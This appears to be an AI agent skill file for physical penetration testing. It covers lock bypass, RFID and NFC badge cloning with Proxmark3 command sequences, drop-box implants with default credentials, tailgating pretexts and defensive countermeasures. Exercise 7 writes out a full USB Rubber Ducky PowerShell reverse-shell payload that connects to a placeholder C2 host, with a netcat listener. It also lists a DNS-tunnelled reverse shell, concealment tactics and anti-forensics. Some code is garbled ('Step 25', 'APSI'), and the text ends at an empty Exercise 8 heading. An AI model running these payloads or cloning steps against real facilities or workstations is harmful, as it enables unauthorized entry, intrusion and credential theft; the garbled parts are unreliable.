---
name: physical-security-testing
description: Physical penetration testing covering mechanical lock bypass (pin-tubular/wafer), RFID/NFC badge cloning (Proxmark3/ESP-RFID-Tool/Walrus), HID iCLASS/Mifare duplication, drop box deployment (LAN Turtle/Packet Squirrel), USB weapons (Rubber Ducky/Bash Bunny), hidden camera placement, and on-site engagement operations including tailgating pretext preparation and physical-docs legal templates.
origin: github-trending-2026
version: 0.1.31
compatibility: ">=0.1.31"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - WebFetch
metadata:
  domain: physical
  tool_count: 12
  guide_count: 1
  mitre: "TA0001-Initial Access (physical), T1192-Hardware Additions, T1366-Physical Security Bypass"
---




# Skill: Physical Security Testing

> **Supplementary Files**:
> - `payloads.md` — Legal/scope templates (TrustedSec physical-docs), lock picking payloads (pin-tubular/wafer/dimple/bump), bypass tool usage (shove knife, under-door, crash bar tape), Proxmark3/ESP-RFID-Tool/Walrus badge cloning, Mifare/HID iCLASS high-freq duplication, LAN Turtle/Packet Squirrel drop boxes, Rubber Ducky/Bash Bunny USB weapon payloads, hidden camera concealment, on-site engagement ops scripts, tailgating pretext prep, exit & evidence handling, and a quick-reference cheat sheet
> - `test-cases.md` — 12 structured test cases (legal scope review, pin-tumbler pick, RFID 125kHz clone, Mifare Classic clone, HID iCLASS decode, LAN Turtle drop box deploy, Rubber Ducky payload, network implant concealment, hidden camera placement, on-site recon, tailgating pretext, exit/evidence) with severity levels and summary tables
> - `guides/physical-security-testing-playbook.md` — End-to-end on-site engagement playbook (pre-flight authorization, 5-phase workflow, entry-vector decision matrix, guard/employee interaction rules, evidence chain-of-custody, integration with adjacent skills)

## Summary

Physical security testing covers the on-site operations that gain physical access to a target facility — lock picking, badge cloning, drop-box deployment, USB-weapon delivery, hidden-camera placement, and the social engineering that gets a human through the door. This skill is the physical-access complement to radio and firmware skills: where `bluetooth-rfid-nfc` analyzes the wireless protocol and `hardware-security` analyzes chips and firmware, this skill asks "how do I get *through the door*?"

**Tools**: Proxmark3, ESP-RFID-Tool, Walrus, Hak5 LAN Turtle, Hak5 Packet Squirrel, USB Rubber Ducky, Bash Bunny, P4wnP1, lock pick set, bump keys, under-door tool, shove knife, hidden cameras.

**Domain**: physical

**MITRE ATT&CK**: TA0001-Initial Access (physical), T1192-Hardware Additions, T1366-Physical Security Bypass

## Description

Physical penetration testing across the full on-site engagement lifecycle: legal scope and authorization (TrustedSec physical-docs templates), pre-engagement reconnaissance (building layout, badge vendor, guard rotation), entry-vector selection (locks vs badges vs USB vs implants vs social), mechanical bypass (pin-tubular, tubular, wafer, dimple; bump keys; shove knife; under-door tool; crash bar tape), radio credential cloning (125 kHz HID Prox/Indala via Proxmark3/ESP-RFID-Tool/Walrus; 13.56 MHz Mifare Classic/DESFire and HID iCLASS via Proxmark3), drop-box deployment (LAN Turtle, Packet Squirrel, Pi Zero W implants) for persistent network access once inside, USB-weapon delivery (Rubber Ducky, Bash Bunny, P4wnP1) for attacker-controlled keystroke injection, hidden camera/audio placement for situational awareness during multi-day engagements, and the social engineering pretexts that turn a locked door into an open one.

This is the access side of the physical+radio stack. Where `bluetooth-rfid-nfc` analyzes BLE/RFID/NFC protocols and `sdr-rf-attack` covers broad RF replay, this skill focuses on the operational question: "what credential do I need, how do I clone it, and how do I use it to enter the facility?" Where `hardware-security` looks at JTAG/UART/firmware extraction, this skill looks at the doors, locks, and readers those devices physically protect.

**Difference from `bluetooth-rfid-nfc`**: That skill covers BLE/RFID/NFC radio analysis (sniffing, protocol fuzzing, decryption). This skill brings the **physical-access perspective** — cloning a 125 kHz HID Prox card to bypass a door reader, duping an HID iCLASS credential for after-hours entry, and the on-site operational discipline (concealment, guard avoidance, evidence handling) that radio work alone doesn't address.

**Difference from `hardware-security`**: That skill targets JTAG/UART/SPI/I2C and firmware extraction. This skill targets the perimeter — locks, badges, drop boxes, USB weapons — the access paths that get an operator in front of the hardware in the first place.

**Difference from `social-engineering`**: That skill covers human manipulation (phishing, vishing, pretext). This skill includes physical-world social engineering — tailgating pretexts, badge impersonation, delivery-driver pretexts — but only as one of five entry vectors. Mechanical and electronic bypass are the primary focus.

**Difference from `sdr-rf-attack`**: That skill covers broad RF replay (garage doors, keyfobs, alarms). This skill covers badge cloning as an on-site access operation, including reader reconnaissance, credential capture at the reader, and the legal/operational framing that pure RF replay doesn't require.

## Use Cases

- **Authorized facility penetration test**: Execute a scoped physical pentest — attempt badge cloning, lock bypass, and drop-box deployment against the client's headquarters or data center, documenting every access path and reporting remediation.
- **Badge system audit (defensive)**: Audit a deployed badge system for cloning susceptibility — test HID Prox (no authentication, trivially cloned), Mifare Classic (CRYPTO1 broken), and report upgrade paths to Mifare DESFire EV2/EV3 or HID iCLASS SE.
- **Drop-box deployment for red team**: Once physical access is achieved, deploy a LAN Turtle or Packet Squirrel inside the target facility to establish persistent VPN pivot for the rest of the red team engagement.
- **USB weapon delivery**: Deliver a Rubber Ducky or Bash Bunny payload to an unattended workstation inside the target facility (e.g., extraction of credentials or beacon deployment) during a physical engagement.
- **DEF CON / Red Team physical CTF**: Practice lock picking, badge cloning, and on-site recon in a competition environment — Schuyler Towne content, DEF CON Physical Security Village, Red Team Village events.
- **Insider-threat physical simulation**: With authorization, test whether an attacker with a single insider's badge (cloned or borrowed) can reach a sensitive area (server room, executive floor) — measure time-to-detection.
- **Building security assessment**: Evaluate the physical controls of a new facility before the client moves in — lock types, reader placement, camera coverage, guard patrol coverage, CPTED (Crime Prevention Through Environmental Design) review.
- **After-hours access testing**: Verify whether badge readers enforce time-of-day restrictions, whether door-forced-open alarms fire correctly, and whether guard response meets the contracted SLA.
- **Hidden camera detection sweep (defensive)**: TSCM (Technical Surveillance Counter-Measures) — sweep a client's executive suite or SCIF for hidden cameras, audio bugs, and unauthorized network implants.
- **Executive protection rehearsal**: Pre-engagement recon of a venue before an executive event — map entry points, identify choke points, document reader vendors and camera coverage.

## Core Tools

### Lock Bypass & Mechanical

| Tool | Purpose | Notes |
|------|---------|-------|
| **Lock pick set** (Peterson, SouthOrd, Sparrows) | Pin-tumbler picking with hooks, rakes, and tension wrenches | Standard 0.025" or 0.018" thickness; transparent practice locks first, then progressively harder belt ranks |
| **Bump keys** | Pin-tumbler bumping — cut to depth 9, instant open on many Kwikset/Schlage | Bumping leaves no tool marks distinguishable from normal wear; legal status varies by jurisdiction |
| **Tubular lock pick** (Lishi, tubular bump) | Tubular cam locks (vending machines, kiosks, some bike locks) | 7-pin and 8-pin variants; Lishi tools decode-and-pick in one motion |
| **Wafer lock pick** (jigglers, tryout keys) | Wafer locks (file cabinets, desks, some vehicle locks) | Pre-cut jiggler sets work against low-quality wafer locks in seconds |
| **Dimple lock pick** (Lishi dimple) | Dimple locks (Kaba, Mul-T-Lock, Assa) — high-security but Lishi 2-in-1 reads bitting | Lishi tools are restricted in some jurisdictions; verify before travel |
| **Shove knife** (under-door bypass) | Slip the latch of an inward-opening door from outside | Works on commercial door hardware with flat latch bolts; fails on anti-shim deadlatches |
| **Under-door tool** (copper wire + tape) | Pull the inside handle of an outward-opening door from outside via the gap under the door | The "Hollywood" tool — widely seen in red team content; works on many commercial lever handles |
| **Crash bar tape / film** | Defeat panic-exit bars by sliding tape over the latch | Works on certain Von Duprin and similar exit devices; newer hardware has anti-tape shields |

### RFID / NFC Cloning

| Tool | Purpose | Command / Notes |
|------|---------|-----------------|
| **Proxmark3** | Standalone RFID/NFC analysis, sniffing, and cloning (125 kHz + 13.56 MHz) | `hf search`, `lf hid read`, `lf hid sim`, `hf mf clone`, `hf 14a sim` |
| **ESP-RFID-Tool** (ESP32-based) | Portable 125 kHz HID Prox/Indala reader and cloner | GitHub trending (572+); smaller and cheaper than Proxmark3; ideal for on-site 125 kHz work |
| **Walrus** (TeamWalrus, iOS/Android) | Smartphone-based NFC cloning for Mifare Classic/DESFire, HID iCLASS via add-on hardware | App store install; the consumer/enthusiast entry point; full keys required for encrypted sectors |
| **Flipper Zero** | Multi-tool with 125 kHz RFID, NFC, sub-1GHz, IR | Popular entry tool; `rfid` and `nfc` apps; less capable than Proxmark3 for raw protocol work |
| **TMD-5S / ACR122U** | USB NFC reader for Mifare Classic nested-key attacks | ACR122U + `mfoc` recovers keys in minutes for default-key cards |
| **HackRF One** | Broad SDR for badge replay at 313 MHz/433 MHz gates and keyfobs | Use sparingly for badge work; Proxmark3 is purpose-built; see `sdr-rf-attack` skill for SDR fundamentals |

### Drop Boxes & Network Implants

| Tool | Purpose | Deployment Notes |
|------|---------|------------------|
| **Hak5 LAN Turtle** | USB-shaped network implant with auto-SSH backdoor, packet capture, DNS spoofing | Plugs into an internal PC or network jack; paired with a Cloud C2 for out-of-band C2 |
| **Hak5 Packet Squirrel** | Ethernet inline implant with payloads (VPN, nmap, tcpdump) | Inline between a device and switch — harder to spot than a Turtle; same Cloud C2 |
| **Bash Bunny** | USB attack platform with keystroke injection, network, storage modes | Multi-vector in a single device; see USB weapons section |
| **Raspberry Pi Zero W** | DIY implant — small, cheap, WiFi-enabled | SSH reverse tunnel over the target's WiFi; conceal in a wall plate or cable bundle |
| **WiFi Pineapple** | Wireless assessment / rogue AP deployment | Use only after physical entry; see `wireless-pentest` skill for protocol detail |
| **Plugable USB-Ethernet adapter** | Concealment-friendly form factor for a USB-Ethernet implant | Hide the implant *inside* a "spare cable adapter" the client won't disturb |

### USB Weapons

| Tool | Purpose | Payload Format |
|------|---------|----------------|
| **USB Rubber Ducky** | Keystroke injection — DuckyScript | `inject.bin` from `duckencode`; examples: reverse shell, exfil, sticky-keys bypass |
| **Bash Bunny** | Keystroke + network + storage attack in one | BunnyScript payloads; can impersonate Ethernet adapter for in-line network attack |
| **P4wnP1** (Pi Zero W) | DIY Rubber Ducky + BadUSB on a $10 board | P4wnP1 A.L.O.A. firmware; flexible HID/network/storage attacks |
| **Evilducker / Digispark** | Sub-$5 HID injection (ATtiny85) | Smaller and less capable than Ducky; useful for cheap-and-cheerful payloads |

### Cameras / Audio / Concealment

| Tool | Purpose | Notes |
|------|---------|-------|
| **Zetta / Blink / Wyze cameras** | Compact hidden cameras for on-site situational awareness | Pre-engagement recon: log guard rounds; never deploy without explicit scope |
| **Custom Pi Zero camera** | DIY concealable camera (Pi Zero W + Pi Camera V2) | Battery + cellular uplink for off-grid monitoring; conceal in office clutter |
| **Audio recorder / pen recorder** | Capture conversations for after-action reporting | Legal status varies — one-party vs two-party consent states; check before recording |
| **Cable manipulator / fake outlet** | Concealment for implants and cameras | Commercial products exist; DIY versions hide implants in wall plates, surge protectors, clock radios |

### Recon & OSINT (Physical)

| Tool | Purpose | Notes |
|------|---------|-------|
| **Google Street View / satellite** | Pre-engagement building layout, entry points, camera placement | Verify on-site; satellite imagery ages |
| **LinkedIn / employee badge photos** | Identify badge vendor (HID, Lenel, etc.) from employee photos | Often visible at conferences or in office tour videos |
| **Job postings** | Identify badge system vendor ("experience with Lenel OnGuard") | Combined with LinkedIn photos, gives the reader vendor pre-engagement |
| **Public building permits** | Confirm security system installers and recent camera upgrades | County/city records; sometimes free |
| **Walk-by recon** | On-site: observe reader vendor, badge design, guard patrol cadence, camera coverage | Legal grey area — stay on public property; never enter without authorization |

## Methodology

### On-Site Engagement Six-Phase Process

```
Phase 1            Phase 2          Phase 3              Phase 4          Phase 5            Phase 6
Scope & Legal  →   Pre-Engagement →  Entry Vector      →  Execution &   →  On-Site Ops &   →  Exit &
                   Recon            Selection              Access           Persistence          Evidence
   │                  │                  │                  │                  │                  │
   ▼                  ▼                  ▼                  ▼                  ▼                  ▼
Contract, ROE,   Building map,    Locks / badges /   Clone badge or    Deploy drop      Reverse tools
get-out-of-jail  badge vendor,    USB / implants /   pick lock;        box, implant      through flow,
card, ID badges  guard cadence,   social — pick     document time     USB, hidden       chain-of-custody
for all ops      camera coverage  lowest-risk        of entry          cameras; pivots   on evidence,
                                                                                           report
```

**Phase 1: Scope & Legal (NO EXCEPTIONS)**

Physical pentest is the highest-risk skill in this workspace. A misread scope clause is a felony. Get this in writing first, always.

- **Engagement contract**: signed scope, dates, target addresses, prohibited areas (HR, executive residences, data center colocation cages owned by a third party).
- **Authorization letter ("get-out-of-jail card")**: client contact name, 24/7 phone, scope summary, engagement dates — carry on every operator at all times; produce immediately if confronted by security or law enforcement.
- **Rules of engagement (ROE)**: prohibited actions (no breaking glass, no picking locks on emergency exits, no social engineering against minors, no decoy devices left after engagement).
- **TrustedSec `physical-docs` templates**: use the community-maintained templates as a baseline; have legal counsel review and customize.
- **Local law review**: lock pick possession is regulated (see "Legal by jurisdiction" in `payloads.md`). The UK, Japan, and several US states (California, Nevada) restrict possession without a credential.
- **Insurance**: verify the engagement is covered by both the client's and the consultancy's insurance.

**Phase 2: Pre-Engagement Recon**

Passive OSINT first, then a walk-by recon pass before any active operation.

- **Building layout**: satellite imagery, Google Street View, public floor plans (real-estate listings, building permits).
- **Badge vendor identification**: LinkedIn photos, conference videos, job postings ("experience with Lenel OnGuard / HID Origo / AMAG Symmetry").
- **Reader vendor on-site**: walk-by recon — HID iCLASS SE readers are blue/white, Symmetry readers are grey, Lenel OnGuard readers are typically black with a side LED.
- **Camera coverage**: identify camera vendors (Axis, Hikvision, Dahua), placement (entry, exits, loading dock), and blind spots.
- **Guard patrol cadence**: walk-by at multiple times of day; log guard rounds; note shift changes.
- **Employee behavior**: badge-tap behavior (do they tailgate?), smoking break patterns, shift change at reception.
- **After-hours activity**: cleaning crews, HVAC contractors, IT staff on late shifts — these are pretexts for after-hours entry.

**Phase 3: Entry Vector Selection**

Score each entry vector against probability of success, time-to-entry, detectability, and reversibility. Pick the lowest-risk path.

| Entry Vector | Probability (typical) | Time to Entry | Detectability | Reversibility |
|--------------|----------------------|---------------|---------------|---------------|
| Tailgating (social) | HIGH (most orgs) | <1 min | LOW (if guard absent) | N/A — no artifact |
| Badge clone (125 kHz HID Prox) | HIGH (if deployed) | <30 s | LOW (reader log shows valid badge) | Badge returns to owner undetected |
| Badge clone (Mifare Classic) | HIGH (CRYPTO1 broken) | <5 min | LOW | Same as above |
| Badge clone (HID iCLASS) | MEDIUM (needs key) | 5-30 min | MEDIUM (cloning requires sniffing) | Reader log may show duplicate tap |
| Lock pick (pin-tumbler, commercial) | HIGH | 10-60 s | LOW (no marks) | No artifact |
| Lock pick (high-security, Medeco/Assa) | LOW | minutes-hours | MEDIUM (tool marks) | May leave forensic evidence |
| USB weapon (unattended workstation) | HIGH (if observed) | <10 s | HIGH (USB device log) | Exfil artifacts may persist |
| Drop-box deploy (LAN Turtle) | MEDIUM (needs network jack) | 30 s | MEDIUM (network admins may notice) | Implant retrievable if undetected |
| Crash bar / shove knife | MEDIUM (hardware-specific) | <10 s | LOW | No artifact |

> **Rule**: try the lowest-detectability, lowest-reversibility-risk vector first. A successful badge clone leaves the badge holder unaware; a successful lock pick leaves no evidence; a successful tailgate leaves no artifact at all. USB weapons and drop boxes are highest-impact but highest-detectability — reserve for after entry is already achieved.

**Phase 4: Execution & Access**

Document everything: timestamps, before/after photos, any deviation from the plan. Wear body cameras (with consent of the client) for after-action review.

- **Badge clone execution**: capture the credential (sniff or borrow), clone to a writable card or Proxmark3 simulation mode, walk to the door, tap, enter.
- **Lock picking execution**: approach the door outside camera coverage (if possible); pick; enter; re-lock from inside if available; document.
- **Tailgating execution**: stage at a smoking area or loading dock; wait for an employee with a badge; follow at conversational distance; thank them at the door ("thanks — left my badge in the car"); produce badge / pretend to tap if challenged.
- **USB weapon execution**: locate unattended workstation (after-hours); insert Bash Bunny / Rubber Ducky; wait for payload completion (LED indicator); remove; leave no other artifacts.

**Phase 5: On-Site Ops & Persistence**

Once inside, the goal shifts to situational awareness, lateral movement, and persistent access.

- **Situational awareness**: deploy a hidden camera at a choke point (break room, elevator lobby) to track guard rounds for the duration of the engagement.
- **Drop-box deployment**: plug a LAN Turtle into an unattended PC's USB port or a wall network jack; verify Cloud C2 check-in before leaving the area.
- **Network implant concealment**: place a Pi Zero W behind a server rack, inside a cable tray, or inside a wall plate; verify reverse-SSH tunnel back to the consultancy.
- **Lateral movement**: from the drop box, scan the internal network, harvest credentials, pivot to higher-value targets (see `post-exploitation`, `ad-ldap-attack` skills).
- **Anti-forensics**: minimize footprint; clear logs only with client authorization; document what was changed for the report.

**Phase 6: Exit & Evidence**

The exit is as operationally sensitive as the entry. A botched exit burns the engagement.

- **Reverse the tools**: re-lock picked doors, return cloned badges to their storage location, retrieve hidden cameras and drop boxes, remove USB weapons.
- **Reverse the persistence**: tear down reverse-SSH tunnels, clear Cloud C2 entries, sanitize implanted devices.
- **Evidence chain-of-custody**: every action timestamped; every artifact (cloned badge, picked lock, deployed implant) photographed before-and-after; chain-of-custody form completed.
- **Hand-off**: deliver the report with timeline, evidence pack, and remediation recommendations. Keep the evidence pack for the contracted retention period; then securely destroy (`shred -uvz` for digital; physical destruction for cloned badges).

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| First-time physical pentest of an office building | Tailgating pretext + lock picking fallback | Badge clone if vendor is HID Prox |
| Test a deployed badge system for cloning susceptibility | Proxmark3 `lf search` for 125 kHz; `hf search` for 13.56 MHz | ESP-RFID-Tool for portable 125 kHz |
| Clone an HID Prox card observed at a distance | ESP-RFID-Tool / Walrus / Proxmark3 `lf hid read` then `lf hid sim` | Borrow and re-badge |
| Clone a Mifare Classic card | Proxmark3 `hf mf autopwn` or ACR122U + `mfoc` | Walrus app with full keys |
| Establish persistent network access inside | LAN Turtle (USB) or Packet Squirrel (Ethernet) | Pi Zero W with reverse-SSH |
| Deliver a quick exfil payload to an unattended PC | USB Rubber Ducky with reverse-shell payload | Bash Bunny in HID mode |
| Open a commercial inward-opening door from outside | Shove knife (if flat latch) | Under-door tool (if lever handle) |
| Open a commercial outward-opening door from outside | Under-door tool | Pretext a fire alarm (HIGH risk — likely out of scope) |
| Recon a building before engagement | LinkedIn + satellite imagery + walk-by | Public permits and contractor listings |
| Hide a long-term implant | Wall plate concealment / fake surge protector | Drop ceiling tile (high discovery risk) |
| Audit own facility for cloning susceptibility | Defensive badge audit (`payloads.md` §13) | Hire an external physical pentest consultancy |
| TSCM sweep for hidden cameras | RF detector + thermal camera + physical inspection | Network scan for known camera MAC OUI |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **Upgrade from 125 kHz HID Prox** | HID Prox has no authentication — any reader can read any card, and any card can be cloned trivially. Migrate to 13.56 MHz Mifare DESFire EV2/EV3 or HID iCLASS SE with mutual authentication. |
| **Mifare Classic → DESFire migration** | CRYPTO1 (Mifare Classic) has been broken since 2008. Default keys are public. DESFire EV2/EV3 use AES-128 and are still considered secure against practical attacks. |
| **Badge tap audit** | Centralize reader logs and run duplicate-tap detection (same badge at two readers within impossible travel time = cloned). |
| **Anti-passback enforcement** | Force badge in/out at every door; reject a second "in" tap without a prior "out." Defeats many tailgating scenarios. |
| **Tailgating detection** | Cameras with people-counting at entry; trained guards at reception; turnstile entries for high-security areas. |
| **CPTED review** | Crime Prevention Through Environmental Design — line-of-sight from reception, controlled landscaping, lighting on all entry points, no dumpsters or loading-dock concealment near doors. |
| **Lock upgrade** | Move from commercial Kwikset/Schlage to high-security (Medeco, Assa, Mul-T-Lock) for sensitive areas; restricted keyway control prevents duplication. |
| **Anti-shim / anti-tape hardware** | Deadlatch (not spring latch) on commercial doors; anti-tape shields on crash bars; reduced door gap to defeat under-door tool. |
| **USB attack surface reduction** | Endpoint protection (Whitelisting USB devices); workstation auto-lock on USB insertion; Group Policy blocking mass-storage and composite HID devices. |
| **Network jack management** | Disable unused network jacks at the switch; 802.1X authentication on every port (defeats LAN Turtle / Packet Squirrel). |
| **Drop-box detection** | Network baselining and anomaly detection — flag any new MAC OUI; switch-port security; periodic physical sweeps of network jacks and server rooms. |
| **Hidden camera detection (TSCM)** | Periodic sweeps with RF detectors, thermal cameras, and physical inspection. Restrict personal electronic devices in sensitive areas. |
| **Guard response SLA** | Contract door-forced-open and door-held-open alarm response to a measurable SLA (e.g., on-site within 5 minutes). Test the SLA quarterly. |
| **Employee training** | Annual tailgating-awareness training; clear policy on challenging unfamiliar people in restricted areas. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: Scope & Legal Pre-Flight

Goal: produce the engagement contract, ROE, and authorization letter before any operational activity.

```bash
# Step 1: Start from TrustedSec physical-docs templates (community-maintained)
git clone https://github.com/trustedsec/physical-docs.git
cd physical-docs
ls templates/   # contract, ROE, authorization-letter, after-action report

# Step 2: Customize for this engagement
# - Replace [CLIENT], [ADDRESS], [DATES] placeholders
# - Have client legal sign the contract
# - Print the authorization letter on client letterhead, signed by an officer
# - Verify client contact's 24/7 phone number

# Step 3: Jurisdiction check for lock pick possession
# - California: possession without locksmith credential is a misdemeanor (Penal Code 466)
# - Nevada: possession with intent to commit burglary
# - UK: Locks and Safes (Restriction on Sale) Act, restricts certain tools
# - Japan: completely prohibited
# Verify local law BEFORE traveling with tools

# Step 4: Insurance verification
# - Confirm the engagement is covered under your E&O (errors and omissions) policy
# - Confirm the client's general liability covers on-site consultants

# Step 5: Operator briefing
# - Every operator carries a copy of the authorization letter
# - Every operator has the client 24/7 contact saved in phone
# - Every operator knows the engagement exit criteria (e.g., "stop if a guard draws")
```

### Exercise 2: Pre-Engagement Building Recon

Goal: produce a recon pack with building layout, badge vendor, camera coverage, and guard cadence.

```bash
# Step 1: Satellite and Street View imagery
# - Google Maps satellite view: identify entrances, loading dock, parking
# - Street View: identify reader vendor on outside doors, camera placement
# - Save screenshots with timestamps

# Step 2: Badge vendor OSINT
# - LinkedIn search for "<client>" employees with badge photos visible
# - Job postings for "<client> security": experience with which vendor?
#   - "Lenel OnGuard" → Lenel S2 (blue reader LED)
#   - "HID Origo / iCLASS SE" → HID (white reader body)
#   - "AMAG Symmetry" → AMAG (grey reader body)
#   - "Software House C-CURE 9000" → Tyco/Johnson Controls
# - Document the inferred vendor and verify on-site

# Step 3: Walk-by recon (ON PUBLIC PROPERTY — never enter without authorization)
# - Walk past the main entrance and loading dock at 8am, noon, 5pm, 10pm
# - Log: reader vendor (visual confirmation), badge design (color, vendor logo),
#   camera coverage (count and placement), guard rotation (shift change times),
#   employee tailgating behavior (count tailgaters per 10 minute window)
# - Take notes only; no photos of badge designs (could be mistaken for surveillance)

# Step 4: Public records
# - County/city building permits: search for "<client> security install"
# - Recent camera upgrades? New access control vendor? Document.

# Step 5: Recon pack output
cat > recon_pack.md <<EOF
# Recon Pack: <CLIENT>, <ADDRESS>
## Engagement window: <START> to <END>

## Building layout
- Main entrance: <location>, readers: <vendor>, cameras: <count>
- Loading dock: <location>, ...
- Side entrances: <list>

## Inferred badge vendor
- LinkedIn photo evidence: <url>  → vendor: <inferred>
- Job posting evidence: <url>  → vendor: <inferred>

## Camera coverage
- Entrance: <vendor>, placement: <description>
- Blind spots identified: <list>

## Guard cadence
- Shift change: <times>
- Patrol route: <description>
- Response time observed: <estimate>
EOF
```

### Exercise 3: RFID 125 kHz Badge Clone (HID Prox)

Goal: clone an HID Prox (125 kHz) badge to a writable card or to Proxmark3 simulation mode.

```bash
# Step 1: Power on Proxmark3 and connect via USB
sudo apt install -y proxmark3
ls /dev/ttyACM*   # Proxmark3 enumerates as /dev/ttyACM0

# Step 2: Drop into Proxmark3 client
pm3

# Step 3: Search low-frequency (125 kHz) tags in the field
pm3> lf search
# Expected output:
#   NOTE: some demods / possibly incorrect data
#   HIDI  HID Prox (Old)  Tag ID: 12345  Format: HID 26-bit
#   Facility: 17  Card: 12345  Raw: ...

# Step 4: Read HID specifically and save to a dictionary
pm3> lf hid read
pm3> lf hid save my_hid.dic

# Step 5: Clone to a writable T5577 card (place T5577 on the antenna)
pm3> lf hid clone --hid 2006e85f3e   # use the value from step 4
#   Writing to T5577 tag ... success

# Step 6: OR simulate the badge from Proxmark3 (leave antenna near the reader)
pm3> lf hid sim --hid 2006e85f3e
#   Simulating HID Prox tag ... (Ctrl-C to stop)

# Step 7: Verify at the door
# - Walk to the door with the cloned T5577 or simulated Proxmark3
# - Tap; reader LED should turn green; door should unlock
# - Note the timestamp for the engagement timeline

# ALTERNATIVE: ESP-RFID-Tool (portable, no laptop required)
# Power on, place original badge on the reader, press READ
# Place T5577 blank on the reader, press WRITE
# Verify at the door — same result

# ALTERNATIVE: Walrus (smartphone-based, Mifare / iCLASS only — NOT HID Prox)
# Walrus is for 13.56 MHz NFC; use Proxmark3 or ESP-RFID-Tool for 125 kHz
```

### Exercise 4: NFC 13.56 MHz Mifare Classic Clone

Goal: clone a Mifare Classic card (CRYPTO1 — broken since 2008).

```bash
# Step 1: Proxmark3 high-frequency search
pm3> hf search
# Expected output:
#   Valid ISO14443A Tag Found - ATQA: 00 04  SAK: 01 [NXP MIFARE CLASSIC 1K | MIFARE Classic]
#   UID: 04 A3 2B 1F
#   Possible types: MIFARE CLASSIC 1K

# Step 2: Automated Mifare Classic key recovery (autopwn)
pm3> hf mf autopwn
#   This tries default keys, nested attacks, hardnested
#   Recovers all sector keys; saves to a dictionary

# Step 3: Dump the card (all sectors with recovered keys)
pm3> hf mf dump
#   Saving dump file hf-mf-04A32B1F-dump.bin
#   Saving keys file hf-mf-04A32B1F-key.bin

# Step 4: Clone to a "magic" UID-writable Mifare Classic card
pm3> hf mf cload hf-mf-04A32B1F-dump.bin
#   Magic UID card detected, writing ... success

# Step 5: Verify at the door

# ALTERNATIVE: ACR122U + mfoc (laptop, USB NFC reader)
sudo apt install -y mfoc
# Place original card on ACR122U
mfoc -O original.mfd -k 000000000000 -k FFFFFFFFFFFF -k A0A1A2A3A4A5 -k D3F7D3F7D3F7
# Place magic UID card
nfc-mfclassic W a original.mfd
```

### Exercise 5: HID iCLASS Cloning (With Key)

Goal: clone an HID iCLASS credential (more secure than HID Prox — requires system key).

```bash
# HID iCLASS uses a proprietary encryption; default system keys leaked years ago
# Standard keys: 0x... (see Proxmark3 iclass dictionary)

# Step 1: Proxmark3 search and identify iCLASS
pm3> hf search
#   Valid ISO15693 / iCLASS Tag Found
#   HID iCLASS
#   CSN: 12 34 56 78 9A BC DE F0

# Step 2: Read iCLASS with the leaked standard key
pm3> hf iclass read --csn 12345678 9ABCDE F0 --key <standard_iclass_key>

# Step 3: iCLASS legacy vs SE
# - Legacy: 26-bit Wiegand, same as HID Prox; trivially clonable
# - iCLASS SE / SEOS: mutual auth; cloning requires the system key; SEOS uses DESFire EV2

# Step 4: Clone to a writable iCLASS card (Q5 / iCLASS clone card)
pm3> hf iclass clone --csn 12345678 9ABCDE F0

# Step 5: For iCLASS SEOS (newer deployments), cloning is materially harder
# - Report SEOS deployment as "low cloning risk" in the engagement report
# - Recommend against Prox and Classic for any new deployment
```

### Exercise 6: Drop-Box Deployment (LAN Turtle)

Goal: deploy a LAN Turtle for persistent network access inside the target.

```bash
# Step 1: Pre-configure the LAN Turtle before engagement
# - SSH to LAN Turtle on its management interface (default 192.168.1.1)
ssh root@192.168.1.1   # default password: sh3llz

# Step 2: Configure Cloud C2 for out-of-band C2
# - Sign up for Hak5 Cloud C2 community edition
# - Generate a device-claim URL
# - On the Turtle:
#   CONFIG SYSTEM C2 ADD URL=<claim_url>

# Step 3: Configure the Turtle's runtime payloads
#   - AUTOSHARK: continuous tcpdump capture
#   - DNSCAT: DNS-tunneled reverse shell (evades most egress filtering)
#   - URLS: SSH URL redirect (acts as a pivot point)

# Step 4: At the engagement site, locate a target network jack
# - Best: unused jack in an office or conference room
# - Alternative: USB port on an always-on workstation

# Step 25: Plug in the Turtle; verify Cloud C2 check-in (takes ~30 seconds)
# - Cloud C2 dashboard shows the device online
# - From C2, you can SSH into the Turtle, run tcpdump, pivot into the network

# Step 6: Document the deployment location and time for the engagement timeline

# Step 7: At engagement end, retrieve the Turtle
# - Cloud C2: DEVICE > RETIRE
# - Physically remove from the jack
# - Document retrieval time
```

### Exercise 7: USB Rubber Ducky Payload

Goal: deliver a reverse-shell payload to an unattended workstation.

```bash
# Step 1: Write the DuckyScript payload (ducky_reverse_shell.txt)
cat > ducky_reverse_shell.txt <<'EOF'
REM Title: Reverse shell for physical engagement
REM Author: kali-claw / physical-security-testing
REM Target: Windows 10/11 with PowerShell
REM Mode: HID injection

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Exec Bypass
DELAY 500
ENTER
DELAY 2000
STRING $c = New-Object System.Net.Sockets.TCPClient('<C2_IP>',4444);
STRING $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
STRING while(($i = $s.Read($b,0,$b.Length)) -ne 0){
STRING   $d = (New-Object Text.APSI.ASCIIEncoding).GetString($b,0,$i);
STRING   $o = (iex $d 2>&1 | Out-String);
STRING   $s.Write(([text.encoding]::ASCII.GetBytes($o)),0,$o.Length)
STRING }
ENTER

# Step 2: Encode to inject.bin
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
cd USB-Rubber-Ducky/Encoder
java -jar duckencode.jar -i ../../ducky_reverse_shell.txt -o ../../inject.bin

# Step 3: Copy inject.bin to a microSD card
sudo dd if=inject.bin of=/dev/sdX bs=1M   # replace /dev/sdX with the microSD

# Step 4: Insert microSD into the Rubber Ducky
# Plug the Ducky into the target workstation
# Wait for the LED to indicate payload completion (~5-10 seconds)
# Remove the Ducky

# Step 5: Verify the C2 listener
nc -lvnp 4444
#   Connect to [C2_IP] from (TARGET) 4444?  yes!
#   Microsoft Windows [Version 10.0.19045.4291]
#   (c) Microsoft Corporation. All rights reserved.
#   C:\Users\<user>\>

# Step 6: Document for the engagement timeline
# - Time of insertion
# - Time of payload completion
# - Time of reverse-shell establishment
# - Time of USB removal
# - Workstation asset tag and location
```

### Exercise 8: Lock Picking (Pin-Tumbler, Commercial)

